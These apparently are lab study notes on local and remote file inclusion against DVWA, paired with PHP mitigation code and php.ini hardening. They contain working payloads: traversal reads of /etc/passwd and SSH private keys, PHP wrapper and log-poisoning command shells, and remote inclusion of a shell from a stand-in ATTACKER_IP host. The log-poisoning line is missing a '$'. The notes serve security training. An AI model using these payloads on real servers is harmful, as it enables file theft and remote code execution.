# File Inclusion Attacks Notes — Task 3

## What is File Inclusion?
File Inclusion vulnerabilities occur when a web application includes files based on user-supplied input without proper validation. Attackers can include local system files (LFI) or remote malicious scripts (RFI).

---

## 1. Local File Inclusion (LFI)

LFI allows reading arbitrary files from the server filesystem. No direct code execution by default, but can be escalated via log poisoning.

### Target (DVWA)
`http://127.0.0.1/dvwa/vulnerabilities/fi/?page=include.php`
Security Level: **Low**

### Basic LFI Payloads
```
?page=../../etc/passwd
?page=../../etc/hosts
?page=../../etc/hostname
?page=../../proc/version
?page=../../proc/self/environ
?page=../../var/log/apache2/access.log
?page=../../var/www/html/dvwa/config/config.inc.php
?page=../../root/.ssh/id_rsa
```

### Directory Traversal Bypass Techniques
```
../../etc/passwd                     Basic traversal
....//....//etc/passwd               Double dot bypass
..%2F..%2Fetc%2Fpasswd              URL encoded
..%252F..%252Fetc%252Fpasswd        Double URL encoded
....\/....\/etc/passwd               Mixed slashes
```

### PHP Wrapper Attacks
```
Read PHP source as base64:
?page=php://filter/convert.base64-encode/resource=index.php
Then: echo "OUTPUT" | base64 -d

Execute PHP via data wrapper:
?page=data://text/plain,<?php echo shell_exec('id'); ?>
```

### Log Poisoning (LFI to RCE)
```
Step 1 - Inject PHP into Apache log via User-Agent header:
curl -v -A "<?php echo shell_exec(GET['cmd']); ?>" http://127.0.0.1/

Step 2 - Execute commands via log file inclusion:
?page=../../var/log/apache2/access.log&cmd=whoami
?page=../../var/log/apache2/access.log&cmd=id
?page=../../var/log/apache2/access.log&cmd=uname+-a
```

---

## 2. Remote File Inclusion (RFI)

RFI includes and executes remote files — leads to direct code execution on the server.

**php.ini requirements:**
```
allow_url_fopen = On
allow_url_include = On
```

### Attack Steps

**Step 1 — Create shell.php on attacker machine:**
```
Contents: PHP code that runs system commands
```

**Step 2 — Host it:**
```bash
python3 -m http.server 8080
```

**Step 3 — Include via RFI:**
```
?page=http://ATTACKER_IP:8080/shell.php&cmd=id
?page=http://ATTACKER_IP:8080/shell.php&cmd=whoami
?page=http://ATTACKER_IP:8080/shell.php&cmd=uname+-a
```

---

## 3. Mitigation

### Whitelist Approach (Best Practice)
```php
// VULNERABLE CODE
$page = $_GET['page'];
include($page);

// SECURE CODE - whitelist only allowed pages
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (!in_array($page, $allowed_pages)) {
    die("Page not found");
}
include("pages/" . $page . ".php");
```

### realpath() Boundary Validation
```php
$base_dir = realpath('/var/www/html/pages/');
$requested = realpath('/var/www/html/pages/' . $_GET['page'] . '.php');

// Ensure resolved path stays within allowed directory
if ($requested === false || strpos($requested, $base_dir) !== 0) {
    die("Access denied");
}
include($requested);
```

### PHP Configuration Hardening
```ini
; In php.ini - these two settings prevent RFI entirely
allow_url_include = Off
allow_url_fopen   = Off

; Restrict file access to web root only
open_basedir = /var/www/html
```

### Strip Traversal Sequences
```php
// Remove ../ and ..\\ sequences
$page = str_replace(['../', '..\\', '..'], '', $_GET['page']);
$page = basename($page);  // Strip all path components
```

---

## 4. LFI vs RFI Comparison

| Feature          | LFI                        | RFI                        |
|------------------|----------------------------|----------------------------|
| File source      | Local server filesystem    | Attacker remote server     |
| Code execution   | Indirect (log poisoning)   | Direct                     |
| Requirement      | Path traversal allowed     | allow_url_include = On     |
| Severity         | High                       | Critical                   |
| Primary fix      | Whitelist + realpath()     | Disable allow_url_include  |

---

## 5. Tools for Testing

```bash
# dotdotpwn - directory traversal fuzzer
dotdotpwn -m http -h 127.0.0.1 -u "/dvwa/vulnerabilities/fi/?page=TRAVERSAL"

# Burp Suite Intruder
# Load SecLists/Fuzzing/LFI/LFI-Jhaddix.txt as payload list
# Fuzz the page parameter

# Manual testing with curl
curl "http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../etc/passwd" \
  --cookie "PHPSESSID=YOUR_SESSION; security=low"
```

---

## Key Takeaways
- LFI exposes `/etc/passwd`, config files, SSH keys, and source code
- Log poisoning escalates LFI to full Remote Code Execution
- `allow_url_include = Off` completely eliminates RFI attacks
- PHP wrappers like `php://filter` and `data://` extend LFI impact
- Whitelist validation with `realpath()` is the most robust defense
